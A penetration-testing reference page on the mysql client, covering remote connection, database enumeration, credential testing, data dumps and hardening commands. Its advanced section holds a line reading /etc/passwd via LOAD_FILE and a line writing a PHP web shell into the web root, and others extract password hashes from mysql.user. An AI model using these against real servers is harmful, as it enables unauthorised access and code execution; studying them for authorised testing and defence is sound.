---
title: mysql
category: discovery
subcategory: database_discovery
phase: 09
mitre_attack: TA0007
tags:
  - database
  - mysql
  - mariadb
  - sql
  - enumeration
difficulty: beginner
os: linux
install: sudo apt install mysql-client
github: https://github.com/mysql/mysql-server
related:
  - mdb-sql
  - oscanner
  - sqlitebrowser
---

# mysql

## Chapter 1: Overview

**mysql** is the command-line client for MySQL/MariaDB databases. In penetration testing, it's used for database enumeration, credential testing, and data extraction from MySQL servers.

### Key Features

- **SQL execution**: Run queries against MySQL
- **Database enumeration**: List databases, tables, users
- **Data extraction**: Export data
- **User management**: Create/modify users
- **Remote access**: Connect to remote servers

### Common Operations

| Operation | Description |
|-----------|-------------|
| Connect | Establish database connection |
| Enumerate | List databases and tables |
| Query | Execute SQL statements |
| Export | Extract data |
| Admin | User management |

---

## Chapter 2: Installation & Setup

```bash
sudo apt update && sudo apt install mysql-client
```

### Verify Installation

```bash
mysql --version
```

---

## Chapter 3: Basic Usage

### Connect to Local Server

```bash
mysql -u root -p
```

### Connect to Remote Server

```bash
mysql -h 192.168.1.1 -u root -p
```

### Connect with Port

```bash
mysql -h 192.168.1.1 -P 3307 -u root -p
```

### Execute Query

```bash
mysql -h 192.168.1.1 -u root -p -e "SELECT VERSION();"
```

---

## Chapter 4: Database Enumeration

### List Databases

```sql
SHOW DATABASES;
```

### Use Database

```sql
USE database_name;
```

### List Tables

```sql
SHOW TABLES;
```

### Describe Table

```sql
DESCRIBE table_name;
SHOW COLUMNS FROM table_name;
```

### Show Create Table

```sql
SHOW CREATE TABLE table_name;
```

---

## Chapter 5: Data Extraction

### Select Data

```sql
SELECT * FROM users;
SELECT * FROM users WHERE username = 'admin';
```

### Count Records

```sql
SELECT COUNT(*) FROM users;
```

### Show Users

```sql
SELECT user, host, authentication_string FROM mysql.user;
```

### Export Data

```bash
mysql -h 192.168.1.1 -u root -p -e "SELECT * FROM users" database_name > export.csv
```

---

## Chapter 6: Advanced Operations

### Check Privileges

```sql
SHOW GRANTS;
SHOW GRANTS FOR 'user'@'host';
```

### File Operations

```sql
-- Read file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');

-- Write file (requires FILE privilege)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### User Enumeration

```sql
SELECT user, host FROM mysql.user;
SELECT user, authentication_string FROM mysql.user;
```

---

## Chapter 7: Real-World Scenarios

### Scenario 1: MySQL Enumeration

```bash
# Connect and enumerate
mysql -h 192.168.1.1 -u root -p

# List databases
SHOW DATABASES;

# List tables in each database
USE database_name;
SHOW TABLES;

# Extract data
SELECT * FROM users;
```

### Scenario 2: Credential Testing

```bash
# Test default credentials
mysql -h 192.168.1.1 -u root -p
mysql -h 192.168.1.1 -u admin -p
mysql -h 192.168.1.1 -u mysql -p
```

### Scenario 3: Data Extraction

```bash
# Export all databases
mysqldump -h 192.168.1.1 -u root -p --all-databases > full_dump.sql

# Export specific database
mysqldump -h 192.168.1.1 -u root -p database_name > db_dump.sql
```

---

## Chapter 8: Mitigation & Defense

**For administrators:**

- Use strong passwords for all accounts
- Restrict remote access
- Limit privileges (least privilege)
- Enable logging
- Use SSL/TLS for connections
- Regular security updates
- Remove default accounts

### MySQL Security Commands

```sql
-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1');

-- Set strong password
ALTER USER 'root'@'localhost' IDENTIFIED BY 'strong_password';

-- Apply changes
FLUSH PRIVILEGES;
```

---

## Resources

- [MySQL Documentation](https://dev.mysql.com/doc/)
- [MySQL Security Guide](https://dev.mysql.com/doc/refman/8.0/en/security.html)
- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/)

---

*Generated for educational purposes in authorized security testing environments only.*
